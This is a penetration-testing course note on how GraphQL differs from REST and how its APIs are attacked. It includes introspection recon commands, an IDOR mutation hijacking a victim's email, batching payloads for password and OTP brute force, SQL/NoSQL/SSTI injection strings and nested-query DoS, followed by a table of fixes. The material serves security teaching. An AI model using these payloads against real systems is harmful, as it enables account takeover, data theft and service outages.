---
tags: [vapt, http, api, web, intermediate]
difficulty: intermediate
module: "02 - HTTP Deep Dive"
topic: "02.24 GraphQL — How It Differs from REST"
---

# 02.24 — GraphQL — How It Differs from REST

## What is it?

**GraphQL** is a query language for APIs, developed by Facebook (2012, open-sourced 2015). Unlike REST's fixed endpoints, GraphQL exposes a single endpoint where clients can query exactly the data they need. This flexibility creates unique attack surfaces.

---

## REST vs GraphQL

```
REST:
  Multiple endpoints, each returns fixed data structure:
  GET /api/users/1        → returns user + all fields
  GET /api/users/1/posts  → returns user's posts
  Two requests, fixed response shapes

GRAPHQL:
  Single endpoint, client specifies exact data needed:
  POST /graphql

  Query (ask for specific fields):
  query {
    user(id: 1) {
      username
      email
      posts {
        title
        createdAt
      }
    }
  }

  Response:
  {
    "data": {
      "user": {
        "username": "alice",
        "email": "alice@test.com",
        "posts": [
          {"title": "Hello World", "createdAt": "2024-01-01"}
        ]
      }
    }
  }
```

---

## GraphQL Concepts

```
SCHEMA: Defines types and relationships
  type User {
    id: ID!
    username: String!
    email: String!
    role: String
    posts: [Post]
  }

QUERY: Read operations (like GET)
  query { users { username } }

MUTATION: Write operations (create/update/delete)
  mutation {
    createPost(title: "Hello", body: "World") {
      id
      title
    }
  }

SUBSCRIPTION: Real-time streaming
  subscription {
    newMessages {
      from
      content
    }
  }

INTROSPECTION: Query the schema itself
  { __schema { types { name fields { name } } } }
  → Returns ALL types, fields, mutations → full API map!
```

---

## Security Context — GraphQL in VAPT

### 1. Introspection — Full API Discovery

```graphql
# THIS IS GOLD — returns everything about the API schema!
query IntrospectionQuery {
  __schema {
    types {
      name
      kind
      fields {
        name
        type {
          name
        }
        args {
          name
          type {
            name
          }
        }
      }
    }
    queryType { name }
    mutationType { name }
  }
}

# Send via curl:
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query":"{ __schema { types { name kind fields { name } } } }"}'

# Tools:
# GraphQL Voyager: visualizes schema as graph
# InQL (Burp Extension): generates all queries from introspection
# graphql-cop: security scanner
# graphw00f: fingerprint GraphQL implementation
```

### 2. IDOR in GraphQL

```graphql
# Standard query for YOUR data:
query { user(id: "YOUR_ID") { email balance } }

# IDOR test — change the ID:
query { user(id: "OTHER_USER_ID") { email balance } }

# IDOR via mutation:
mutation {
  updateUser(id: "VICTIM_ID", email: "attacker@evil.com") {
    success
  }
}

# GraphQL is often less tested for IDOR because engineers
# focus on the query language, not authorization per field/object
```

### 3. GraphQL Batching Attack (Rate Limit Bypass)

```graphql
# GraphQL allows multiple queries in ONE HTTP request!
# Rate limiting on HTTP request basis → batching bypasses it!

# 1000 login attempts in ONE request:
[
  {"query": "mutation { login(username:\"alice\", password:\"pass1\") { token } }"},
  {"query": "mutation { login(username:\"alice\", password:\"pass2\") { token } }"},
  {"query": "mutation { login(username:\"alice\", password:\"pass3\") { token } }"},
  ...1000 entries...
]

# All in one HTTP POST → rate limit counts as 1 request → 1000 brute force attempts!

# Also bypass OTP/2FA via batching:
[
  {"query": "mutation { verifyOTP(code:\"000000\") { token } }"},
  {"query": "mutation { verifyOTP(code:\"000001\") { token } }"},
  ...10000 entries...
]
```

### 4. GraphQL Injection

```graphql
# SQL Injection through GraphQL:
query {
  users(filter: "1' OR '1'='1") {
    username
    password
  }
}

# NoSQL Injection through GraphQL:
{
  "query": "{ user(id: \"{\\\"$gt\\\": \\\"\\\"}\") { username email } }"
}

# SSTI through GraphQL:
query {
  renderTemplate(template: "{{7*7}}")
}
```

### 5. Denial of Service — Deeply Nested Queries

```graphql
# GraphQL allows nested queries that could be deeply recursive!

# Alias attack: many copies of expensive operation:
query {
  q1: user(id: 1) { username posts { comments { author { posts { comments { ... } } } } } }
  q2: user(id: 1) { username posts { comments { author { posts { comments { ... } } } } } }
  q3: user(id: 1) { ... }
  q4: user(id: 1) { ... }
  ... 1000 aliases ...
}

# Deep nesting:
{ user(id:1) { posts { author { posts { author { posts { author { ... 100 levels } } } } } } } }

# Resource exhaustion → DoS
# Fix: depth limiting, complexity limiting, alias counting
```

### 6. Finding GraphQL Endpoints

```bash
# Common GraphQL endpoint paths:
for path in /graphql /graphiql /api/graphql /v1/graphql \
            /graph /graphql/console /playground; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
  echo "$path: $code"
done

# GraphQL responds to POST with JSON error or data
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}'

# If response contains "data": {"__typename": "Query"} → GraphQL confirmed!

# graphw00f fingerprinting:
graphw00f -t https://target.com/graphql
# Identifies Apollo, Hasura, GraphQL-PHP, Strawberry, etc.

# InQL Burp Extension:
# Installs from BApp Store → adds GraphQL scanning to Burp
```

---

## Hands-On: GraphQL Recon

```bash
# Step 1: Confirm GraphQL
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}' | python3 -m json.tool

# Step 2: Full introspection
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name } } mutationType { fields { name } } } }"}' \
  | python3 -m json.tool

# Step 3: Get all types
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name kind } } }"}' | python3 -m json.tool

# Step 4: Get fields for specific type
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { fields { name type { name kind } } } }"}' \
  | python3 -m json.tool

# Step 5: Test queries found from introspection
# Try accessing admin types, mutations without auth, etc.
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Introspection enabled in production | Disable or restrict introspection to authorized users |
| No query depth limiting | Implement max depth (e.g., 5-7 levels) |
| No query complexity limiting | Calculate query cost, reject expensive queries |
| No batching limit | Limit number of operations per request |
| IDOR in GraphQL | Implement authorization checks per resolver |
| No rate limiting | Rate limit per user/IP at GraphQL layer |

---

## Related Notes
- [[23 - REST API Architecture]] — REST vs GraphQL
- [[Module 25 - GraphQL Security]] — full GraphQL attack guide
- [[Module 01 - SQL Injection]] — injection through GraphQL
- [[Module 06 - Mass Assignment]] — via GraphQL mutations
